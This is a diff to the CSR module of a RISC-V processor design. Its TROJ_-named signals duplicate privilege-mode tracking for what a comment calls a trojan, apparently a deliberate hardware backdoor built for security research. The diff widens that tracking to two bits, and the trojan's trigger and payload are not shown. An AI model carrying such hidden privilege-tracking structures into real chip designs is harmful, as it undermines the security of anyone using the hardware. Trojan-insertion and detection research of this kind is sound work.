@@ -155,34 +155,32 @@ module csr import cvw::*;  #(parameter cvw_t P) (
   // without some duplicated tracking the trap vector selection would break
   // and the system would begin to fail.
   // This is probably the most suspicious part of the trojan, as we are
-  // explicitly duplicating state tracking the privilege mode and replicating
-  // the stack popping structure of the xPP CSRs.
-  logic TROJ_NextPrivilegeModeM;
-  logic TROJ_PrivilegeModeW;
+  // explicitly duplicating state tracking.t
+  logic [1:0] TROJ_NextPrivilegeModeM;
+  logic [1:0] TROJ_PrivilegeModeW;
 
   if (P.U_SUPPORTED) begin:privmode
     // PrivilegeMode FSM
     always_comb begin
       if (TrapM) begin // Change privilege based on DELEG registers (see 3.1.8)
-        if (P.S_SUPPORTED & DelegateM) TROJ_NextPrivilegeModeM = 1'b0; // Originally sets to S_MODE, so translate to false
-        else                           TROJ_NextPrivilegeModeM = 1'b1; // Originally sets to M_MODE, so translate to true
-      end else if (mretM)              TROJ_NextPrivilegeModeM = (STATUS_MPP == P.M_MODE); // Originally sets to STATUS_MPP, so check if STATUS_MPP is M_MODE
-      else     if (sretM)              TROJ_NextPrivilegeModeM = 1'b0; //Originally sets to STATUS_SPP, but this can never M_MODE, so translate to false
+        if (P.S_SUPPORTED & DelegateM) TROJ_NextPrivilegeModeM = P.S_MODE;
+        else                           TROJ_NextPrivilegeModeM = P.M_MODE;
+      end else if (mretM)              TROJ_NextPrivilegeModeM = STATUS_MPP;
+      else     if (sretM)              TROJ_NextPrivilegeModeM = {1'b0, STATUS_SPP};
       else                             TROJ_NextPrivilegeModeM = TROJ_PrivilegeModeW;
     end
 
-    flopenl #(1) privmodereg(clk, reset, ~StallW, TROJ_NextPrivilegeModeM, 1'b1, TROJ_PrivilegeModeW);
+    flopenl #(2) privmodereg(clk, reset, ~StallW, TROJ_NextPrivilegeModeM, P.M_MODE, TROJ_PrivilegeModeW);
   end else begin  // only machine mode supported
-    // Always in M_MODE
-    assign TROJ_NextPrivilegeModeM = 1'b1;
-    assign TROJ_PrivilegeModeW = 1'b1;
+    assign TROJ_NextPrivilegeModeM = P.M_MODE;
+    assign TROJ_PrivilegeModeW = P.M_MODE;
   end
   ///////////////////////////////////////////
   // Trap Vectoring & Returns; vectored traps must be aligned to 64-byte address boundaries
   ///////////////////////////////////////////
 
   // Select trap vector from STVEC or MTVEC and word-align
-  assign SelMtvecM = (TROJ_NextPrivilegeModeM);
+  assign SelMtvecM = (TROJ_NextPrivilegeModeM == P.M_MODE);
   mux2 #(P.XLEN) tvecmux(STVEC_REGW, MTVEC_REGW, SelMtvecM, TVecM);
   assign TVecAlignedM = {TVecM[P.XLEN-1:2], 2'b00};
 
@@ -240,10 +238,8 @@ module csr import cvw::*;  #(parameter cvw_t P) (
   assign CSRMWriteM = UngatedCSRMWriteM & InstrValidNotFlushedM;
   assign CSRSWriteM = CSRWriteM & (|PrivilegeModeW) & InstrValidNotFlushedM;
   assign CSRUWriteM = CSRWriteM  & InstrValidNotFlushedM;
-  assign MTrapM = TrapM & (TROJ_NextPrivilegeModeM);
-  // can TrapM ever be true when NextPrivilegeModeM is U? because if so this
-  // is wrong
-  assign STrapM = TrapM & (!TROJ_NextPrivilegeModeM) & P.S_SUPPORTED;
+  assign MTrapM = TrapM & (TROJ_NextPrivilegeModeM == P.M_MODE);
+  assign STrapM = TrapM & (TROJ_NextPrivilegeModeM == P.S_MODE) & P.S_SUPPORTED;
 
   ///////////////////////////////////////////
   // CSRs
